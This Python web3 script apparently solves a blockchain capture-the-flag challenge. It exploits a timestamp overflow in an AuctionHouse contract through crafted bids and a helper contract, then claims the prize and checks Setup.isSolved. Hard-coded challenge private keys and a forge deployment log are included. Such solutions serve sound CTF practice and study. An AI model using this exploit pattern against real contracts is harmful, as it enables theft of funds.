from web3 import Web3
import json
from web3.gas_strategies.rpc import rpc_gas_price_strategy
from solcx import compile_source, install_solc, compile_files

x = {
    "PrivateKey": "0x4447c67fe4186a19ccb3b9e97487a63c0cc47a5389aba21472e9bb07d078fc3f",
    "Address": "0xc9C371e1Df726BB42d849bCE59674543df0915f9",
    "TargetAddress": "0x9CD3Fc15a9A963274Fe569b9bdaFcC9E1c0678eA",
    "setupAddress": "0xabe05B68843dA39b0C88DDF9cBbF8a71846F8581"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]

Target2Contract = "0xF40E9f7387474d0744072B1A1E36B9081A747d5C"

url = 'http://167.172.62.51:30904/rpc'

YEAR = 31556926

values = [2**63, 1, 2*1+1, 2*3+1, 2*7+1 , 2*15+1, 2*31+1, 2*63+1, 2*127+1, 2*255+1, 2*511+1, 2*1023+1, 2*2047+1, 2*4095+1, 2*8191+1, 2*(2**14-1)+1, 2*(2**15-1)+1, 2*(2**16-1)+1, 2*(2**17-1)+1, 2*(2**18-1)+1,2*(2**19-1)+1,2*(2**20-1)+1 ]
#values = [2**63, 0]

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
timeout0 = w3.eth.get_block(block_number).timestamp
print(block_number)
print(timeout0)

timegap = 2**32 - timeout0
print(f'Time gap: {timegap}')
adjust = 1
index = timegap//YEAR + adjust
print(f'Gap counter: {index}')

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)

install_solc("0.7.0")

compiled = compile_files(["Contract.sol"], output_values=["abi"], solc_version="0.7.0")
abi_contract = compiled['Contract.sol:Contract']['abi']

compiled = compile_files(["AuctionHouse.sol"], output_values=["abi"], solc_version="0.7.0")
abi = compiled['AuctionHouse.sol:AuctionHouse']['abi']
contract_instance = w3.eth.contract(address=TargetContract, abi=abi)

addr = Address
target = TargetContract
target2 = Target2Contract

contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi_contract)

ii = 0
for i in range(index//2 + 1):
	value = values[ii]
	ii += 1
	w3.eth.send_transaction({"from":addr, "to":target2,"value":value,})
	#contract_instance2.functions.attack2(value).transact()
	print(f'{i}-1')
	print(f'value = {value}')
	t = contract_instance.functions.timeout().call()
	print(contract_instance.functions.topBidder().call())
	print(t)
	#if t == 0:
	#	break
	#print(contract_instance.functions.keyOwner().call())

	value = values[ii]
	ii += 1
	w3.eth.send_transaction({"from":addr, "to":target,"value":value,})
	#w3.eth.call({"to":target,"value":value,})

	print(f'{i}-2')
	print(f'value = {value}')
	print(contract_instance.functions.topBidder().call())
	print(contract_instance.functions.timeout().call())
	#print(contract_instance.functions.keyOwner().call())

#contract_instance2.functions.withdraw().call()
#contract_instance2.functions.claim().call()
print(contract_instance.functions.topBidder().call())
print(addr)
print(contract_instance.functions.keyOwner().call())

print(w3.eth.get_block("latest").timestamp)
print(contract_instance.functions.timeout().call())

contract_instance.functions.claimPrize().call()


compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.7.0")
abi = compiled['Setup.sol:Setup']['abi']

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved(account_address).call()

print(f'The current number stored is: { number } ')
#

'''
https://ctftime.org/writeup/31583
https://0xsage.medium.com/ethernaut-lvl-4-walkthrough-how-to-abuse-tx-origin-msg-sender-ef37d6751c8

forge init . --no-git

forge create src/Contract.sol:Contract --rpc-url http://209.97.176.174:31323/rpc --private-key 0x643f9dae7f3636d00fddb4236351c6136001b2cb5641b49ea1f72c327e5f1981
[⠰] Compiling...
[⠔] Compiling 1 files with 0.8.20
[⠒] Solc 0.8.20 finished in 40.18ms
Compiler run successful!
Deployer: 0xd44C694e6280032dA55cEF6715aA3d89c1AD4836
Deployed to: 0x855ad55752bCE030B8D8875d671494eE3F51B1e7
Transaction hash: 0xfcbc1aca59dc9b42ce5c917c38d28b7ba60488ab115b25aa9c425ac6513709e0


Change the address in Contract.sol, align with TargetAddress in rpc url
Change the address in dec.py, align with the new deplyed address by forge

'''
